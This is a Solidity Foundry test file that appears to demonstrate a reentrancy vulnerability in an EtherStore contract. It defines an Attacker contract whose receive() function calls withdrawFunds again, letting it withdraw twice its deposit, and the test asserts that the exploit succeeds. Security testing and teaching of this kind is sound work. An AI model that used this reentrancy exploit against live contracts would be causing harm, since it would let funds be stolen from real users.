
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {EtherStore} from "../src/EtherStore.sol";

contract TestReentrancyEtherStore is Test {
    EtherStore public etherStore;
    Attacker public _attacker;

    function setUp() public {
        etherStore = new EtherStore();
        _attacker = new Attacker(address(etherStore));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal <= 1 ether);
        vm.assume(attackVal <= type(uint128).max);

        vm.warp(block.timestamp + 2 weeks);

        vm.deal(address(etherStore), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    EtherStore public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedValue;

    constructor(address victimAddress) {
        victim = EtherStore(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedValue = val;
        
        victim.depositFunds{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        victim.withdrawFunds(val);
        
        if (address(this).balance == initialSnapshot + (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.withdrawFunds(storedValue);
        }
    }

    fallback() external payable {}
}
